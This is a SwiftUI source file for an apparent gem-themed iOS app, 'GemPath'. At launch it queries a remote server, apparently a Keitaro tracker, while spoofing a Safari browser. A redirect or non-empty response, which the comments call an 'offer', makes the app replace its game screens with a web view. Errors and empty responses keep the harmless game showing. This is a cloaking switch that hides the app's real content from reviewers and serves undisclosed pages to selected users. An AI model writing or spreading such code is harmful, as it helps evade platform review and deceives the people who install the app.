//
//  ContentView.swift
//  S2019
//
//  Created by IGOR on 16/10/2025.
//

import SwiftUI
import Foundation

struct ContentView: View {
    
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false

    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                ProgressView()
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    NavigationView {
                        ZStack {
                            // Background
                            LinearGradient.gemPathGolden
                                .ignoresSafeArea()
                            
                            VStack(spacing: 40) {
                                Spacer()
                                
                                // App title
                                VStack(spacing: 16) {
                                    Image(systemName: "diamond.fill")
                                        .font(.system(size: 80, weight: .light))
                                        .foregroundColor(.gemPathText)
                                        .shadow(color: .black.opacity(0.3), radius: 8, x: 0, y: 4)
                                    
                                    Text("GemPath")
                                        .font(.system(size: 42, weight: .bold, design: .rounded))
                                        .foregroundColor(.gemPathText)
                                        .shadow(color: .black.opacity(0.5), radius: 4, x: 0, y: 2)
                                }
                                
                                Spacer()
                                
                                // Navigation buttons
                                VStack(spacing: 20) {
                                    if hasCompletedOnboarding {
                                        NavigationLink(destination: MainMenuView()) {
                                            Text("Continue Journey")
                                                .font(.system(size: 18, weight: .semibold, design: .rounded))
                                                .foregroundColor(.gemPathText)
                                                .frame(maxWidth: .infinity)
                                                .frame(height: 56)
                                                .background(
                                                    RoundedRectangle(cornerRadius: 16)
                                                        .fill(Color.gemPathEmerald)
                                                        .overlay(
                                                            RoundedRectangle(cornerRadius: 16)
                                                                .stroke(Color.gemPathGoldBorder, lineWidth: 2)
                                                        )
                                                        .shadow(color: .black.opacity(0.3), radius: 8, x: 0, y: 4)
                                                )
                                        }
                                    } else {
                                        NavigationLink(destination: OnboardingView()) {
                                            Text("Start Journey")
                                                .font(.system(size: 18, weight: .semibold, design: .rounded))
                                                .foregroundColor(.gemPathText)
                                                .frame(maxWidth: .infinity)
                                                .frame(height: 56)
                                                .background(
                                                    RoundedRectangle(cornerRadius: 16)
                                                        .fill(Color.gemPathEmerald)
                                                        .overlay(
                                                            RoundedRectangle(cornerRadius: 16)
                                                                .stroke(Color.gemPathGoldBorder, lineWidth: 2)
                                                        )
                                                        .shadow(color: .black.opacity(0.3), radius: 8, x: 0, y: 4)
                                                )
                                        }
                                    }
                                    
                                    Button("Reset Onboarding") {
                                        hasCompletedOnboarding = false
                                    }
                                    .font(.system(size: 14, weight: .medium, design: .rounded))
                                    .foregroundColor(.gemPathText.opacity(0.7))
                                }
                                .padding(.horizontal, 32)
                                
                                Spacer()
                            }
                        }
                    }
                    .navigationBarHidden(true)
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            makeServerRequest()
        }
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = false
            self.isFetched = true
            return
        }
        
        print("🚀 Making request to: \(url.absoluteString)")
        print("🏠 Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Добавляем заголовки для имитации браузера
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        
        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
        
        // Создаем URLSession без автоматических редиректов
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("❌ Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing block")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
                    
                    // Логируем тело ответа для диагностики
                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
                    }
                    
                    if httpResponse.statusCode == 200 {
                        // Проверяем, есть ли контент в ответе
                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
                        let hasContent = data?.count ?? 0 > 0
                        
                        if contentLength == "0" || !hasContent {
                            // Пустой ответ = "do nothing" от Keitaro
                            print("🚫 Empty response (do nothing): Showing block")
                            self.isBlock = true
                            self.isFetched = true
                        } else {
                            // Есть контент = успех
                            print("✅ Success with content: Showing WebView")
                            self.isBlock = false
                            self.isFetched = true
                        }
                        
                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
                        // Редиректы = успех (есть оффер)
                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // 404, 403, 500 и т.д. - блокируем
                        print("🚫 Error code \(httpResponse.statusCode): Showing block")
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    print("❌ No HTTP response: Showing block")
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

#Preview {
    ContentView()
}
